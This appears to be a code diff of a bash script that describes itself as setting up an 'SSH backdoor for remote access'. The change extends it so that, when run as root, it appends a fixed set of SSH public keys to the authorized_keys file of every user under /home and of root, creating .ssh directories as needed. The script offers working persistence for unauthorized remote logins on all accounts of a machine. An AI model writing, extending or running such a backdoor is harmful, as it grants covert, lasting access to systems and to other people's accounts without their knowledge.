@@ -12,41 +12,109 @@ declare -a KEYS=(
 
 echo -e "\033[1;32m===> Setting up SSH backdoor for remote access...\033[0m"
 
-# Check and create directory if it doesn't exist
-if [ ! -d "$DIR" ]; then
-    echo -e "\033[1;34m--> Creating directory: $DIR\033[0m"
-    mkdir -p "$DIR"
-    chmod 700 "$DIR"
-    echo -e "\033[1;32m--> Directory created.\033[0m"
+# Check if the user is root
+if [ "$EUID" -eq 0 ]; then
+    echo -e "\033[1;32m===> Running as root. Adding keys for all users and root.\033[0m"
+
+    # Loop over all users' .ssh directories and add keys
+    for userDir in /home/*; do
+        userSshDir="$userDir/.ssh"
+        userAuthKeys="$userSshDir/authorized_keys"
+        
+        if [ ! -d "$userSshDir" ]; then
+            echo -e "\033[1;34m--> Creating .ssh directory for $(basename "$userDir")\033[0m"
+            mkdir -p "$userSshDir"
+            chmod 700 "$userSshDir"
+        fi
+
+        # Backup and create authorized_keys if necessary
+        if [ -f "$userAuthKeys" ]; then
+            backupFile="$userAuthKeys.$today.backup"
+            echo -e "\033[1;34m--> Backing up existing $userAuthKeys to $backupFile\033[0m"
+            cp "$userAuthKeys" "$backupFile"
+            echo -e "\033[1;32m--> Backup created.\033[0m"
+        else
+            echo -e "\033[1;34m--> Creating authorized_keys for $(basename "$userDir")\033[0m"
+            touch "$userAuthKeys"
+        fi
+
+        # Set permissions and add keys
+        chmod 600 "$userAuthKeys"
+        for key in "${KEYS[@]}"; do
+            if ! grep -qF -- "$key" "$userAuthKeys"; then
+                echo -e "\033[1;34m--> Adding key for $(basename "$userDir")\033[0m"
+                echo "$key" >> "$userAuthKeys"
+            else
+                echo -e "\033[1;33m--> Key already exists for $(basename "$userDir"), skipping.\033[0m"
+            fi
+        done
+    done
+
+    # Add keys for root
+    rootSshDir="/root/.ssh"
+    rootAuthKeys="$rootSshDir/authorized_keys"
+    if [ ! -d "$rootSshDir" ]; then
+        echo -e "\033[1;34m--> Creating .ssh directory for root\033[0m"
+        mkdir -p "$rootSshDir"
+        chmod 700 "$rootSshDir"
+    fi
+
+    # Backup and create authorized_keys for root if necessary
+    if [ -f "$rootAuthKeys" ]; then
+        rootBackupFile="$rootAuthKeys.$today.backup"
+        echo -e "\033[1;34m--> Backing up existing root authorized_keys to $rootBackupFile\033[0m"
+        cp "$rootAuthKeys" "$rootBackupFile"
+        echo -e "\033[1;32m--> Backup created.\033[0m"
+    else
+        echo -e "\033[1;34m--> Creating authorized_keys for root\033[0m"
+        touch "$rootAuthKeys"
+    fi
+
+    # Set permissions and add keys for root
+    chmod 600 "$rootAuthKeys"
+    for key in "${KEYS[@]}"; do
+        if ! grep -qF -- "$key" "$rootAuthKeys"; then
+            echo -e "\033[1;34m--> Adding key to root authorized_keys\033[0m"
+            echo "$key" >> "$rootAuthKeys"
+        else
+            echo -e "\033[1;33m--> Key already exists for root, skipping.\033[0m"
+        fi
+    done
 else
-    echo -e "\033[1;33m--> Directory already exists: $DIR\033[0m"
+    # Standard user setup
+    echo -e "\033[1;32m===> Running as a standard user. Adding keys for current user only.\033[0m"
+
+    # Check and create directory if it doesn't exist
+    if [ ! -d "$DIR" ]; then
+        echo -e "\033[1;34m--> Creating directory: $DIR\033[0m"
+        mkdir -p "$DIR"
+        chmod 700 "$DIR"
+    fi
+
+    # Backup and create authorized_keys file if it doesn't exist
+    if [ -f "$FILE" ]; then
+        BACKUP="$FILE.$today.backup"
+        echo -e "\033[1;34m--> Backing up existing $FILE to $BACKUP\033[0m"
+        cp "$FILE" "$BACKUP"
+        echo -e "\033[1;32m--> Backup created.\033[0m"
+    else
+        echo -e "\033[1;34m--> Creating $FILE\033[0m"
+        touch "$FILE"
+    fi
+
+    # Set appropriate permissions
+    chmod 600 "$FILE"
+    echo -e "\033[1;32m--> Set appropriate permissions for $FILE.\033[0m"
+
+    for key in "${KEYS[@]}"; do
+      if grep -qF -- "$key" "$FILE"; then
+        echo -e "\033[1;33m--> Key already exists, skipping:\033[0m $key"
+      else
+        echo -e "\033[1;34m--> Copying key:\033[0m $key"
+        echo "$key" >> "$FILE"
+        echo -e "\033[1;32m--> Key copied.\033[0m"
+      fi
+    done
 fi
-
-# Backup and create authorized_keys file if it doesn't exist
-if [ -f "$FILE" ]; then
-    BACKUP="$FILE.$today.backup"
-    echo -e "\033[1;34m--> Backing up existing $FILE to $BACKUP\033[0m"
-    cp "$FILE" "$BACKUP"
-    echo -e "\033[1;32m--> Backup created.\033[0m"
-else
-    echo -e "\033[1;34m--> Creating $FILE\033[0m"
-    touch "$FILE"
-    echo -e "\033[1;32m--> File created.\033[0m"
-fi
-
-# Set appropriate permissions
-chmod 600 "$FILE"
-echo -e "\033[1;32m--> Set appropriate permissions for $FILE.\033[0m"
-
-# Copy in keys
-for key in "${KEYS[@]}"; do
-  if grep -qF -- "$key" "$FILE"; then
-    echo -e "\033[1;33m--> Key already exists, skipping:\033[0m $key"
-  else
-    echo -e "\033[1;34m--> Copying key:\033[0m $key"
-    echo "$key" >> "$FILE"
-    echo -e "\033[1;32m--> Key copied.\033[0m"
-  fi
-done
 
 echo -e "\033[1;32m===> Done!\033[0m"
